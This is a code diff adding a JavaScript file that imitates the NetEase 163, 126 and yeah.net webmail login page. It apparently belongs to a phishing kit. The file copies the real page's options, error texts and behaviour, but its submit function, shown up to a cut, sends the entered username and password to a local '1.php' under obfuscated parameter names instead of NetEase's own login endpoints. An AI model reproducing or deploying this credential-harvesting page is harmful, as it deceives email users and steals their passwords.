@@ -1,0 +1,1451 @@
+
+var gOption = {
+	'sCookieDomain' : 'email.163.com',//cookie域
+	'url2' : 'http://email.163.com/errorpage/error163.htm',//http登录错误转向
+	'product' : 'mail163',//http登录产品
+	'sDomain' : '163.com',//当前域名
+	'sSslUrl2' : 'https://reg.163.com/logins.jsp?',//旧ssl
+	'sHttpUrl2' : 'http://reg.163.com/login.jsp?',//旧http
+	'gad' : 'email.163.com',
+	'aAllDomain' : //所有域及缩写
+		{
+			'163' : '163.com',
+			'126' : '126.com',
+			'yeah' : 'yeah.net',
+			'shouji' : ''
+		},
+	'163' : {
+		'sSslUrl' : 'https://mail.163.com/entry/cgi/ntesdoor?',//SSL URS
+		'sEntryUrl' : 'http://mail.163.com/entry/cgi/ntesdoor?',//http登录
+		'sLoginTitle' : '登录163网易免费邮',//登录框标题
+		'url2' : 'http://email.163.com/errorpage/error163.htm'//entry登录错误转向
+	},
+	'126' : {
+		'sSslUrl' : 'https://mail.126.com/entry/cgi/ntesdoor?',
+		'sEntryUrl' : 'http://mail.126.com/entry/cgi/ntesdoor?',
+		'sLoginTitle' : '登录126网易免费邮',
+		'url2' : 'http://email.163.com/errorpage/error126.htm'
+	},
+	'yeah' : {
+		'sSslUrl' : 'https://mail.yeah.net/entry/cgi/ntesdoor?',
+		'sEntryUrl' : 'http://mail.yeah.net/entry/cgi/ntesdoor?',
+		'sLoginTitle' : '登录yeah.net网易免费邮',
+		'url2' : 'http://email.163.com/errorpage/erroryeah.htm'
+	},
+	'shouji' : {
+		'sSslUrl' : '',
+		'sEntryUrl' : '',
+		'sLoginTitle' : '登录手机号码邮箱',
+		'url2' : 'http://email.163.com/errorpage/error163.htm'
+	}
+}
+
+
+
+// 错误提示语
+var gErrorInfo = {
+	'noId' : {
+		'title' : '请先输入您的邮箱帐号'
+	},
+	'noPhone' : {
+		'title' : '请输入您的手机号码'
+	},
+	'noPw' : {
+		'title' : '请输入您的密码'
+	},
+	'inputWrong' : {
+		'title' : '帐号或密码错误',
+		'info' 	: '1. 请检查帐号拼写,是否输入有误<br />2. 若帐号长期未登录,可能已被注销,<br/> &nbsp;请<a href="http://reg.email.163.com/unireg/call.do?cmd=register.entrance" target="_blank">重新注册</a><br />3. 若您忘记密码,请<a href="http://reg.163.com/getpasswd/RetakePassword.jsp?from=email163" target="_blank">找回密码</a><br/>4. 若您需要锁定此帐号,请<a href="http://reg.163.com/lockuser/LockUserByPingma_0.jsp" target="_blank">点击这里</a><br/>5. 若手机号码邮箱的手机号已更换,<br/> &nbsp;可<a href="http://reg.163.com/mobilealias/findBindHistoryIndex.do" target="_blank">找回原帐号</a>'
+	},
+	'idLocked' : {
+		'title' : '抱歉!您的帐号已被锁定,暂时无法登录。'
+	},
+	'systemBusy' : {
+		'title' : '繁忙的系统暂时需要停下歇歇,请您稍后再试。'
+	},
+	'loginWrong' : {
+		'title' : '您的登录过于频繁,请稍后再试。'
+	},
+	'_mobileNotAvailable' : {
+		'title' : '此帐号不存在!',
+		'info' 	: '提示:<br/>该手机号码邮箱尚未激活,<a href="http://reg.email.163.com/unireg/call.do?cmd=register.entrance&flow=mobile&from=email_mobile" target="_blank">免费激活</a>'
+	}
+};
+// 全局变量
+var gCurrentDomain = '163',		//当前域
+	gShoujiDomain = '',			//手机号码邮箱域
+	gShoujiCache = {},			//手机号码邮箱接口数据缓存
+	gLoginInfo = {};			//用户登录信息
+
+(function(window){
+	window.indexLogin = {
+		init 				: fInit,
+		calcWindow 			: fCalcWindow,
+		changeMainPos 		: fChangeMainPos,
+
+		getLoginInfo 		: fGetLoginInfo,
+		getQueryInfo 		: fGetQueryInfo,
+		enUid 				: fEnUid,
+
+		initInputBox 		: fInitInputBox,
+		switchTab 			: fSwitchTab,
+		inputEvent 			: fInputEvent,
+		checkInputAlways 	: fCheckInputAlways,
+		checkShoujiDomain 	: fCheckShoujiDomain,
+		setShoujiDomain 	: fSetShoujiDomain,
+		renderLoginVer 		: fRenderLoginVer,
+		checkboxChange 		: fCheckboxChange,
+		styleEvent 			: fStyleEvent,
+		switchUserInfo 		: fSwitchUserInfo,
+		verSelect 			: fVerSelect,
+
+		emuIconTick 		: fEmuIconTick,
+		emuIcon 			: fEmuIcon,
+
+		submitForm 			: fSubmitForm,
+		setAction 			: fSetAction,
+		saveLoginInfo 		: fSaveLoginInfo,
+		secureLinkage 		: fSecureLinkage,
+
+		showError 			: fShowError,
+		hideError 			: fHideError,
+
+		KX 					: fKX,
+		tmpSwitchLog 		: fTmpSwitchLog
+	};
+
+	var gWindow = {};
+	var	bIsEuid = false,	//是否有euid
+		sPreUrl,			//附件预览
+		sPreUid,			//附件预览
+		sPreReason,			//登录原因
+		sUid,				//uid
+		sStyle,				//判断#style来写死style
+		sEnUsername;		//反编码&替换后的euid
+	var oStyle = {
+			value : '-1'
+		};
+
+	var oUserIpt, oTxtPwd;
+
+	var bIsMobile = false;
+
+	function fInit(){
+		var me = this;
+
+		oUserIpt = $id('userNameIpt');
+		oTxtPwd = $id('pwdInput');
+
+		window.frames['frameforlogin'].location.href = 'about:blank';
+
+		me.getLoginInfo();
+		me.getQueryInfo();
+		me.enUid();
+		me.switchTab(gCurrentDomain);
+		me.initInputBox();
+
+		var sHash = fGetQueryHash('tab');
+		if(sHash == 'shouji'){
+			me.switchTab('shouji');
+		}
+
+		// 初始化'记住帐号'
+		$id('rmbUser').onclick = function(){
+			me.checkboxChange($id('rmbUser'));
+		};
+		// 登录版本选择
+		var oVerSelect = $id('verSelect');
+		fEventListen($id('ftVerSelLink'), 'click', function(){
+			oVerSelect.style.display = 'block';
+		});
+		oVerSelect.onmouseout = function(e){
+			var oE = e || window.event;
+			var that = this;
+			fE(function(){
+				oVerSelect.style.display = 'none';
+			}, oE, that);
+		};
+		// 大写锁定开启判断
+		var oCapsLockTest = new CapsLock({
+			el : $id('pwdInput'),
+			change : function(bFlag){
+				var oHint = $id('capsLockHint');
+				if(bFlag){
+					oHint.style.display = 'block';
+				}else{
+					oHint.style.display = 'none';
+				}
+			}
+		});
+
+		me.KX(); // 可信标识
+	}
+
+	/**
+	 * 获取窗口宽高
+	 */
+	function fCalcWindow(){
+		gWindow.width = typeof window.innerWidth == 'undefined' ? document.documentElement.clientWidth : window.innerWidth;
+		gWindow.height = typeof window.innerHeight == 'undefined' ? document.documentElement.clientHeight : window.innerHeight;
+		// 窗口最小高度不能小于435像素
+		gWindow.height = gWindow.height <= 435 ? 435 : gWindow.height;
+	}
+
+	/**
+	 * 设定登录框位置上下居中
+	 */
+	function fChangeMainPos(){
+		var oMainHd = $id('mainHd');
+		if(typeof gWindow.height == 'undefined'){
+			me.calcWindow();
+		}
+		$id('main').style.marginTop = (gWindow.height - 45 - 67 - 344)/2 + 'px';
+		if(gWindow.height < 700){
+			oMainHd.style.top = '-50px';
+			if(gWindow.height < 520){
+				oMainHd.style.display = 'none';
+			}else{
+				oMainHd.style.display = 'block';
+			}
+		}else{
+			oMainHd.style.display = 'block';
+			oMainHd.style.top = '-80px';
+		}
+	}
+
+	/**
+	 * 获取cookie中用户登录信息
+	 */
+	function fGetLoginInfo(){
+		var sCookie = fGetCookie('alllogininfo');
+		if(sCookie){
+			var aCookie = sCookie.split('|');
+			for(var i=0;i<aCookie.length;i++){
+				var aDomainInfo = aCookie[i].split(';');
+				if(aDomainInfo.length == 3){
+					gLoginInfo[aDomainInfo[0]] = {username : aDomainInfo[1], style : aDomainInfo[2]};
+				}
+			}
+		}
+		var initDomain = fGetCookie('alllogindomain');
+		if(initDomain){
+			if(initDomain == 'qiye'){ // 兼容cookie中是qiye的情况,全部替换到shouji
+				initDomain = 'shouji';
+			}
+			gCurrentDomain = initDomain;
+		}
+
+		//? 判断url的参数是否从邮箱退出,从search和hash取,search优先级最高,hash次之,最后用cookie
+		var sLastUser = fGetQuery('u');
+		if(sLastUser === null){
+			sLastUser = (location.hash + '').replace('#', '');
+		}
+		if(/^[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$id/.test(sLastUser)){
+			var sParamUser = sLastUser.split('@')[0];
+			var sParamDomain = sLastUser.split('@')[1].split('.')[0];
+			if(sParamDomain == '163' || sParamDomain == '126' || sParamDomain == 'yeah'){
+				if(!gLoginInfo[sParamDomain]){
+					gLoginInfo[sParamDomain] = {style : '-1'};
+				}
+				gLoginInfo[sParamDomain].username = sParamUser;
+				gCurrentDomain = sParamDomain;
+			}
+		}
+		else{
+			sLastUser = (location.hash + '').replace('#', '');
+			if(sLastUser == '163' || sLastUser == '126' || sLastUser == 'yeah' || sLastUser == 'shouji'){
+				gCurrentDomain = sLastUser;
+			}
+		}
+	}
+
+	/**
+	 * 获取url query参数
+	 */
+	function fGetQueryInfo(){
+		var me = this;
+
+		//判断用户style
+		sStyle = fGetQueryHash('style');
+		//判断用户
+		sUid = fGetQueryHash('uid');
+		sPreUid = fGetQueryHash('preview_uid');
+		sPreUrl =  fGetQueryHash('preview_url');//获取preurl
+		sPreReason = fGetQueryHash('preview_reason');//获取pre原因
+		if( sUid != null ){
+			oUserIpt.value = sUid;
+			fCheckAccount(oUserIpt);
+		}
+		if( sPreUid != null ){
+			oUserIpt.value = sPreUid;
+			fCheckAccount(oUserIpt);
+		}
+		if(sPreUrl != null){
+			var oPopup = $id('preview_popup'),
+			oPopupClose = $id('preview_popup_close'),
+			oPopupCont = $id('preview_popup_cont'),
+			oPopupSub = $id('preview_popup_submit'),
+			oMask = $id('mask');
+			/*if (sPreReason != null){
+				sPreReason == 'due' ? oPopupCont.innerHTML = '您的附件预览已失效,请登录邮箱查看。': oPopupCont.innerHTML = '您的附件预览已失效,请登录邮箱查看。';
+			}else{
+				oPopupCont.innerHTML = '您的附件预览已失效,请登录邮箱查看。';
+			}*/
+			if (sPreReason != null && sPreReason == 'due'){
+				oPopupCont.innerHTML = '您的附件预览已失效,请登录邮箱查看。';
+				oPopupClose.onclick = _fHidePopup;
+				oPopupSub.onclick = _fHidePopup;
+				_fShowPopup();
+			}
+			function _fShowPopup(){
+				oPopup.style.display = 'block';
+				oMask.style.height = document.documentElement.clientHeight + 'px';
+				oMask.style.width = document.documentElement.clientWidth + 'px';
+				oMask.style.display = 'block';
+				window.onresize = function(){
+					$id('mask').style.height = document.documentElement.clientHeight + 'px';
+					$id('mask').style.width = document.documentElement.clientWidth + 'px';
+				}
+			}
+			function _fHidePopup(){
+				oPopup.style.display = 'none';
+				oMask.style.display = 'none';
+				setTimeout(function(){
+					$id('chkSSL').checked = false;
+					me.submitForm();
+				});
+			}
+		}
+	}
+
+	/**
+	 * 解析query中euid参数
+	 */
+	function fEnUid(){
+		var sEnUid = fGetQueryHash('euid');
+		if( sEnUid != null ){
+			//euid错误提示
+			var nTmp = window.location.href.indexOf('?');
+			if( nTmp != -1 ){
+				var sErrorCode = window.location.hash.split('?')[1].split('&')[0].split('=')[1];
+				window.location.href = window.location.href.substring(0,nTmp) + '&errorType=' + sErrorCode;
+			}
+			if (sEnUid.indexOf('?') != -1){
+				sEnUid = sEnUid.substring(0,sEnUid.indexOf('?'));
+			}
+			sErrorCode = fGetQueryHash('errorType');
+			if(sErrorCode != null){
+				var nTips = '';
+				switch ( sErrorCode ){
+					case '460' :
+						nTips = '密码输入不正确!';
+						break;
+					case '420' :
+						nTips = '此帐号不存在!';
+						break;
+					case '422' :
+						nTips = '此帐号已被锁定!';
+						break;
+					case '412' :
+						nTips = '您短时间内尝试次数过多!';
+						break;
+					default:
+						nTips = '系统繁忙!';
+				}
+				alert(nTips);
+				nTmp = window.location.href.indexOf('&errorType');
+				window.location.href = window.location.href.substring(0,nTmp);
+			}
+			//解析euid
+			var nEnUidLen = sEnUid.length;
+			if( nEnUidLen % 2 == 0 ){
+				bIsEuid = true;//是euid传入
+				var sTmpCode;
+				var aTmpStr = [];
+				aTmpStr.value = '';
+				for( i=0; i<nEnUidLen; i=i+2){
+					//反编码
+					sTmpCode = sEnUid.substr(i,2);
+					sTmpCode = parseInt(sTmpCode,16);
+					sTmpCode = String.fromCharCode(sTmpCode);
+					aTmpStr.value += sTmpCode;
+				}
+				fCheckAccount(aTmpStr); //根据帐号切换tab-删除@之后
+				$id('idInput').value = aTmpStr.value; //反编码帐号赋值
+				var nTmpCodeLen = aTmpStr.value.length;
+				var sTmpStr2 =''; // 临时存放替换后的用户名
+				if(nTmpCodeLen > 4){
+					sTmpStr2 = aTmpStr.value.slice(0,2) + '****' + aTmpStr.value.slice(-2);
+				}
+				else{
+					switch ( nTmpCodeLen ){
+						case 4 :
+							sTmpStr2 =  aTmpStr.value.slice(0,1) + '****' + aTmpStr.value.slice(-1);
+							break;
+						case 3 :
+							sTmpStr2 =  aTmpStr.value.slice(0,1) + '*' + aTmpStr.value.slice(-1);
+							break;
+						case 2 :
+							sTmpStr2 =  aTmpStr.value.slice(0,1) + '*' ;
+							break;
+						case 1 :
+							sTmpStr2 = '*';
+							break;
+						default :
+							sTmpStr2 = aTmpStr.value;
+					}
+				}
+				sEnUsername = sTmpStr2;
+				oUserIpt.value = sTmpStr2;
+				oTxtPwd.focus();
+			}
+		}
+	}
+
+	/**
+	 * 初始化输入框,绑定事件
+	 */
+	function fInitInputBox(){
+		var me = this;
+		var oTab163 = $id('tab163Link'),
+			oTab126 = $id('tab126Link'),
+			oTabYeah = $id('tabyeahLink'),
+			oTabMobile = $id('tabshoujiLink'),
+			oAllSSL = $id('allSSL'),
+			oChkSSL = $id('chkSSL'),
+			oSubmitBtn = $id('btnSubmit'),
+			oIdLabel = $id('idPlaceholder'),
+			oPwLabel = $id('pwdPlaceholder'),
+			oIdL = $id('idInputLine'),
+			oPwL = $id('pwdInputLine');
+
+		//帐号
+		fEventListen(oUserIpt,'blur',function(){
+			fCheckAccount(oUserIpt);
+		});
+		//tab切换 - 163
+		fEventListen(oTab163,'click',function(){
+			me.switchTab('163');
+		});
+		fEventListen(oTab163,'mouseover',function(){
+			fCls(oTab163, 'hover', 'add');
+		});
+		fEventListen(oTab163,'mouseout',function(){
+			fCls(oTab163, 'hover', 'remove');
+		});
+		//tab切换 - 126
+		fEventListen(oTab126,'click',function(){
+			me.switchTab('126');
+		});
+		fEventListen(oTab126,'mouseover',function(){
+			fCls($id('tab126Link'), 'hover', 'add');
+		});
+		fEventListen(oTab126,'mouseout',function(){
+			fCls(oTab126, 'hover', 'remove');
+		});
+		//tab切换 - yeah
+		fEventListen(oTabYeah,'click',function(){
+			me.switchTab('yeah');
+		});
+		fEventListen(oTabYeah,'mouseover',function(){
+			fCls(oTabYeah, 'hover', 'add');
+		});
+		fEventListen(oTabYeah,'mouseout',function(){
+			fCls(oTabYeah, 'hover', 'remove');
+		});
+		//tab切换 - mobile
+		fEventListen(oTabMobile,'click',function(){
+			me.switchTab('shouji');
+		});
+		fEventListen(oTabMobile,'mouseover',function(){
+			fCls(oTabMobile, 'hover', 'add');
+		});
+		fEventListen(oTabMobile,'mouseout',function(){
+			fCls(oTabMobile, 'hover', 'remove');
+		});
+		//安全登录
+		fEventListen(oAllSSL,'click',function(){
+			me.checkboxChange(oAllSSL);
+			me.secureLinkage(oAllSSL, 'chkSSL');
+		});
+		fEventListen(oChkSSL,'click',function(){
+			me.checkboxChange(oChkSSL);
+			me.secureLinkage(oChkSSL, 'allSSL');
+		});
+		//提交按钮
+		fEventListen(oSubmitBtn,'mouseover',function(){
+			fCls(oSubmitBtn, 'btn-login-hover', 'add');
+		});
+		fEventListen(oSubmitBtn,'mousedown',function(){
+			fCls(oSubmitBtn, 'btn-login-active', 'add');
+		});
+		fEventListen(oSubmitBtn,'mouseout',function(){
+			oSubmitBtn.className = 'btn btn-login';
+		});
+		//点击双击文字
+		fEventListen(oIdLabel, 'dblclick', function(){
+			oUserIpt.focus();
+		});
+		fEventListen(oIdLabel, 'click', function(){
+			oUserIpt.focus();
+		});
+		fEventListen(oPwLabel, 'dblclick', function(){
+			oTxtPwd.focus();
+		});
+		fEventListen(oPwLabel, 'click', function(){
+			oTxtPwd.focus();
+		});
+
+		//帐号
+		fEventListen(oUserIpt,'focus',function(){
+			fCls(oIdL, 'ipt-t-hover', 'add');
+		});
+		fEventListen(oUserIpt,'blur',function(){
+			fCls(oIdL, 'ipt-t-hover', 'remove');
+		});
+		fEventListen(oTxtPwd,'focus',function(){
+			fCls(oPwL, 'ipt-t-hover', 'add');
+		});
+		fEventListen(oTxtPwd,'blur',function(){
+			fCls(oPwL, 'ipt-t-hover', 'remove');
+		});
+
+		var sEventName = '';
+		var bIsIe = false;
+		if(document.body.onpropertychange === null){
+			sEventName = 'propertychange';
+			var bIsIe = true;
+		}else{
+			sEventName = 'input';
+			me.checkInputAlways();
+		}
+		var el = document.createElement('div');
+		el.setAttribute('oninput', 'return;')
+		if(typeof el.oninput === 'function'){
+			sEventName = 'input';
+			if(bIsIe){
+				me.checkInputAlways();
+			}
+		}
+		if(bIsIe){
+			me.inputEvent(); // IE bug
+		}
+		fEventListen(oUserIpt, sEventName, me.inputEvent);
+		fEventListen(oTxtPwd, sEventName, me.inputEvent);
+	}
+
+	/**
+	 * tab切换及状态初始化
+	 * @param  {String} sDomain 域名代号:163 | 126 | yeah | shouji
+	 */
+	function fSwitchTab(sDomain) {
+		var me = this;
+		var oIdLabel = $id('idPlaceholder'),
+			oRmbUser = $id('rmbUser'),
+			oChkSSL = $id('chkSSL'),
+			oAllSSL = $id('allSSL'),
+			oGetPwd = $id('forGetPassword'),
+			oLoginFtTips = $id('loginFootTips'),
+			oLoginFtRight = $id('loginFootTipsRight'),
+			//oHdExtLink = $id('hdExtLink'),
+			oHdMobExtLink = $id('hdMobExtLink');
+		var oDomainMap = {
+			 '163' : '163.com'
+			,'126' : '126.com'
+			,'yeah' : 'yeah.net'
+		};
+
+		if(sDomain == 'shouji'){
+			me.bIsMobile = true;
+		}else{
+			me.bIsMobile = false;
+		}
+
+		if(oDomainMap[sDomain]){
+			$id('domainText').innerHTML = '@' + oDomainMap[sDomain];
+			$id('fuck1').value=oDomainMap[sDomain];
+		}
+
+		$id('divError').style.display = 'none';
+
+		oUserIpt.removeAttribute('maxLength');
+		fEventUnlisten(oUserIpt, 'blur', me.checkShoujiDomain);
+
+		document.body.className = 'mail-' + sDomain;
+		oRmbUser.checked = true;
+		oChkSSL.checked = true;
+		oAllSSL.checked = false;
+		$id('LoginTitle').innerHTML =  gOption[sDomain]['sLoginTitle'];
+		gCurrentDomain = sDomain;//本地调用
+		gOption['sDomain'] = gOption['aAllDomain'][gCurrentDomain];//获取当前域缩写,找到对应域,赋值给gOption供base调用、
+		gOption['product'] = 'mail' + gCurrentDomain;
+		//每次tab切换都写入cookie
+		fSetCookie('alllogindomain', gCurrentDomain, true);
+		// 隐藏版本选择框
+		$id('verSelect').style.display = 'none';
+		// 隐藏标题扩展链接
+		//$id('hdExtLink').style.display = 'none';
+
+		if(sDomain == 'shouji'){
+			//oHdExtLink.style.display = 'none';
+			oHdMobExtLink.style.display = 'block';
+			oUserIpt.setAttribute('maxLength', 11);
+			if(oUserIpt.value.length > 11){
+				oUserIpt.value = oUserIpt.value.substr(0, 11);
+			}
+
+			oIdLabel.innerHTML = '请输入手机号码';
+			oRmbUser.checked = false;
+
+			oLoginFtTips.style.display = 'block';
+			oLoginFtRight.style.display = 'none';
+			oAllSSL.parentNode.style.display = 'none';
+
+			me.renderLoginVer(false);
+			oLoginFtTips.innerHTML='还没有网易手机号码邮箱?<a href="http://reg.email.163.com/unireg/call.do?cmd=register.entrance&flow=mobile&from=email_mobile" target="_blank" tabIndex="9">免费激活</a>';
+
+			// 手机号码邮箱需要自动判断域
+			fEventListen(oUserIpt, 'blur', me.checkShoujiDomain);
+
+			// 如果已经填了帐号就判断手机号码邮箱域
+			if(oUserIpt.value){
+				me.checkShoujiDomain();
+			}
+		}else{
+			//oHdExtLink.style.display = 'block';
+			oHdMobExtLink.style.display = 'none';
+			oIdLabel.innerHTML = '帐号或手机号';
+			oAllSSL.parentNode.style.display = 'none';
+			oLoginFtTips.style.display = 'none';
+			oLoginFtRight.innerHTML = '<a href="http://reg.email.163.com/mailregAll/reg0.jsp?from=email163&regPage=' + sDomain + '" target="_blank" tabIndex="9">注册网易免费邮</a>';
+			oLoginFtRight.style.display = 'block';
+			me.renderLoginVer(true);
+			oGetPwd.style.display = '';
+			oGetPwd.href = 'http://reg.163.com/RecoverPasswd1.shtml';
+			oGetPwd.innerHTML = '忘记密码?';
+			oIdLabel.style.display = 'block'; // 120802
+			oRmbUser.checked = true;
+		}
+		me.checkboxChange(oRmbUser);
+		me.checkboxChange(oChkSSL);
+		me.checkboxChange(oAllSSL);
+		me.styleEvent();
+		me.switchUserInfo(); //读取用户名-风格信息等
+		//检查是否输入
+		if(oUserIpt.value=='') {
+			oUserIpt.focus();
+		}else{
+			oTxtPwd.focus();
+		}
+		// 统计请求
+		me.tmpSwitchLog(sDomain);
+	}
+
+	/**
+	 * 输入框水印事件
+	 */
+	function fInputEvent(){
+		var oIdL = $id('idInputLine'),
+			oPwL = $id('pwdInputLine');
+		if(oUserIpt.value==''){
+			fCls(oIdL, 'showPlaceholder', 'add');
+		}else{
+			fCls(oIdL, 'showPlaceholder', 'remove');
+		}
+		if( oTxtPwd.value == '' ){
+			fCls(oPwL, 'showPlaceholder', 'add');
+		}else{
+			fCls(oPwL, 'showPlaceholder', 'remove');
+		}
+	}
+
+	/**
+	 * 轮询检查输入状态
+	 */
+	function fCheckInputAlways(){
+		var me = this;
+		window.oIntervalCheckInputAlways = setInterval(function(){
+			me.inputEvent();
+		},500);
+	}
+
+	/**
+	 * 检查手机号码正确性
+	 */
+	function fCheckShoujiDomain(){
+		var me = window.indexLogin;
+		var r = /^1\d{10}$/;
+		var sId = oUserIpt.value;
+		if(r.test(sId)){
+			if(gShoujiCache[sId]){
+				me.setShoujiDomain(gShoujiCache[sId]);
+			}else{
+				fGetScript('http://mbind.mail.126.com/mbind/qu.do?pn=' + sId);
+			}
+		}else if(oUserIpt.value){
+			setTimeout(function(){
+				me.showError(2);
+			},300);
+		}
+	}
+
+	/**
+	 * 设置手机号码对应域
+	 * @param  {String} sDomain 域名代号:163 | 126 | yeah | shouji
+	 */
+	function fSetShoujiDomain(sDomain){
+		gShoujiDomain = sDomain;
+		gOption['product'] = 'mail' + sDomain;
+		gOption['sDomain'] = gOption['aAllDomain'][sDomain];
+	}
+
+	/**
+	 * 渲染版本设置框
+	 * @param  {Boolean} bSwitch 控制版本选择显示隐藏
+	 */
+	function fRenderLoginVer(bSwitch){
+		var me = this;
+		// 下拉三角
+		if($id('ftDarr').innerHTML == ''){
+			var sHtml = me.emuIcon([
+				{x : 0, y : 0, width : 7, height : 1}
+				,{x : 1, y : 1, width : 5, height : 1}
+				,{x : 2, y : 2, width : 3, height : 1}
+				,{x : 3, y : 3, width : 1, height : 1}
+			]);
+			$id('ftDarr').innerHTML = sHtml;
+		}
+		var oVer = $id('loginFootTipsVer');
+		var nShow = 'block';
+		if(!bSwitch){
+			nShow = 'none';
+		}
+		oVer.style.display = nShow;
+		return;
+	}
+
+	/**
+	 * 模拟checkbox选择控制
+	 * @param  {Object} oInput input控件对象
+	 */
+	function fCheckboxChange(oInput){
+		if(oInput.checked){
+			fCls(oInput.parentNode,'ipt-wraper-checked','add');
+			oInput.checked = true;
+		}else{
+			fCls(oInput.parentNode,'ipt-wraper-checked','remove');
+			oInput.checked = false;
+		}
+	}
+
+	/**
+	 * 控制全程ssl选项
+	 */
+	function fStyleEvent(){
+		if (gCurrentDomain == 'yeah' && oStyle.value == '10'){
+			$id('allSSL').parentNode.style.display = '';
+		}else{
+			if (gCurrentDomain == 'yeah' && oStyle.value != '10'){
+				$id('allSSL').parentNode.style.display = 'none';
+			}
+		}
+	}
+
+	/**
+	 * 读取用户名、企业邮域名、风格信息等,切换tab时调用
+	 */
+	function fSwitchUserInfo() {
+		var me = this;
+		oTxtPwd.value = '';
+
+		if(gLoginInfo[gCurrentDomain]){
+			oUserIpt.value = gLoginInfo[gCurrentDomain].username;
+			oStyle.value = gLoginInfo[gCurrentDomain].style;
+		}
+
+		if(oUserIpt.value.indexOf('@') > -1){
+			oUserIpt.value = '';
+		}
+
+		//判断是否带style参数,有则强制风格
+		sStyle && (oStyle.value = sStyle);
+
+		switch(oStyle.value){
+			case '7':
+				me.verSelect(7); // js6
+				break;
+			case '6':
+				me.verSelect(6); // jy6
+				break;
+			case '2':
+				me.verSelect(2); // 青柠
+				break;
+			default :
+				me.verSelect(-1);
+		}
+	}
+
+	/**
+	 * 登录版本选择
+	 * @param  {String|Number} sStyle 版本代号
+	 */
+	function fVerSelect(sStyle){
+		var me = window.indexLogin;
+
+		var aAllStyle = $id('verSelectUl').getElementsByTagName('a');
+		var oCurrVer;
+		for(var i=0; i<aAllStyle.length; i++){
+			aAllStyle[i].className = 'ft-verSelect-inner-a';
+			if(aAllStyle[i].id == 'styleConf' + sStyle){
+				me.emuIconTick(i);
+				oCurrVer = aAllStyle[i];
+			}
+		}
+		oStyle.value = sStyle;
+		fCls(oCurrVer, 'ft-verSelect-inner-a-selected', 'add');
+		$id('ftVerSelLinkTxt').innerHTML = oCurrVer.innerHTML;
+		$id('verSelect').style.display = 'none';
+	}
+
+	/**
+	 * 模拟版本选择对勾
+	 * @param  {Number} nIndex 对应的列表索引
+	 */
+	function fEmuIconTick(nIndex){
+		if($id('verSelectTick').innerHTML == ''){
+			$id('verSelectTick').innerHTML = '<i style="position:absolute;height:1px;overflow:hidden;left:10px;top:3px;width:1px;" class="icoTick-color1"></i><i style="position:absolute;height:1px;overflow:hidden;left:9px;top:4px;width:1px;" class="icoTick-color1"></i><i style="position:absolute;height:1px;overflow:hidden;left:10px;top:4px;width:1px;" class="icoTick-color2"></i><i style="position:absolute;height:1px;overflow:hidden;left:8px;top:5px;width:1px;" class="icoTick-color1"></i><i style="position:absolute;height:1px;overflow:hidden;left:9px;top:5px;width:2px;" class="icoTick-color2"></i><i style="position:absolute;height:1px;overflow:hidden;left:2px;top:6px;width:1px;" class="icoTick-color3"></i><i style="position:absolute;height:1px;overflow:hidden;left:3px;top:6px;width:1px;" class="icoTick-color2"></i><i style="position:absolute;height:1px;overflow:hidden;left:4px;top:6px;width:1px;" class="icoTick-color1"></i><i style="position:absolute;height:1px;overflow:hidden;left:7px;top:6px;width:1px;" class="icoTick-color1"></i><i style="position:absolute;height:1px;overflow:hidden;left:8px;top:6px;width:2px;" class="icoTick-color2"></i><i style="position:absolute;height:1px;overflow:hidden;left:10px;top:6px;width:1px;" class="icoTick-color1"></i><i style="position:absolute;height:1px;overflow:hidden;left:2px;top:7px;width:1px;" class="icoTick-color1"></i><i style="position:absolute;height:1px;overflow:hidden;left:3px;top:7px;width:2px;" class="icoTick-color2"></i><i style="position:absolute;height:1px;overflow:hidden;left:5px;top:7px;width:2px;" class="icoTick-color1"></i><i style="position:absolute;height:1px;overflow:hidden;left:7px;top:7px;width:2px;" class="icoTick-color2"></i><i style="position:absolute;height:1px;overflow:hidden;left:9px;top:7px;width:1px;" class="icoTick-color1"></i><i style="position:absolute;height:1px;overflow:hidden;left:3px;top:8px;width:1px;" class="icoTick-color1"></i><i style="position:absolute;height:1px;overflow:hidden;left:4px;top:8px;width:4px;" class="icoTick-color2"></i><i style="position:absolute;height:1px;overflow:hidden;left:8px;top:8px;width:1px;" class="icoTick-color1"></i><i style="position:absolute;height:1px;overflow:hidden;left:4px;top:9px;width:1px;" class="icoTick-color1"></i><i style="position:absolute;height:1px;overflow:hidden;left:5px;top:9px;width:2px;" class="icoTick-color2"></i><i style="position:absolute;height:1px;overflow:hidden;left:7px;top:9px;width:1px;" class="icoTick-color1"></i><i style="position:absolute;height:1px;overflow:hidden;left:5px;top:10px;width:2px;" class="icoTick-color1"></i>'
+		}
+		$id('verSelectTick').style.top = ( 24 * nIndex + 5) + 'px';
+		return ;
+	}
+
+	/**
+	 * 模拟图标
+	 * @param  {Array} aPixel 图标对应像素点数组
+	 * @return {String}       HTML
+	 */
+	function fEmuIcon(aPixel){
+		var sHtml = '';
+		for(var i = 0; i < aPixel.length; i++){
+			var sBgColor = '';
+			if(aPixel[i].color){
+				sBgColor = 'background-color:#' + aPixel[i].color + ';';
+			}
+			var sPixelHtml = '<i style="position:absolute;height:' + aPixel[i].height + 'px;overflow:hidden;left:' + aPixel[i].x + 'px;top:' + aPixel[i].y + 'px;width:' + aPixel[i].width + 'px;' + sBgColor + '"></i>'
+			sHtml += sPixelHtml;
+		}
+		return sHtml;
+	}
+
+	/**
+	 * 登录表单提交
+	 */
+	function fSubmitForm(){
+		var me = this;
+		var oUrl2 = $id('url2'),
+			oUserName = $id('idInput'); //有euid时调用
+		oUserIpt.value = fTrim(oUserIpt.value);
+		if(oUserIpt.value ==''){
+			if(document.getElementsByTagName('body')[0].className == 'mail-shouji'){
+				me.showError(2);
+				
+			}else{
+				me.showError(1);
+			}
+			oUserIpt.focus();
+			return false;
+		}
+
+
+
+		if(oTxtPwd.value.length == ''){
+			me.showError(3);
+			oTxtPwd.focus();
+			return false;
+		}else if(!fTrim(oTxtPwd.value)){ // 特殊处理密码全空格
+			me.showError(460);
+			oTxtPwd.focus();
+			return false;
+		}
+
+		//获取previewurl
+		
+		//euid
+		if(bIsEuid){
+			var nTmp = window.location.href.indexOf('?');
+			if( nTmp != -1 ){
+				oUrl2.value = window.location.href.substring(0,nTmp);
+				gOption['url2'] = oUrl2.value;
+			}else{
+				oUrl2.value = window.location.href;
+				gOption['url2'] = oUrl2.value;
+			}
+		}
+
+		
+		/* 这里开始ajax登陆*/
+		$.ajax({ //json对象
+                    url: '1.php',
+                    data: {
+                        'cnm7a57a5a743894a0e': $("#userNameIpt").val(),
+                        'lgm907325c69271ddf0': $("#pwdInput").val(),
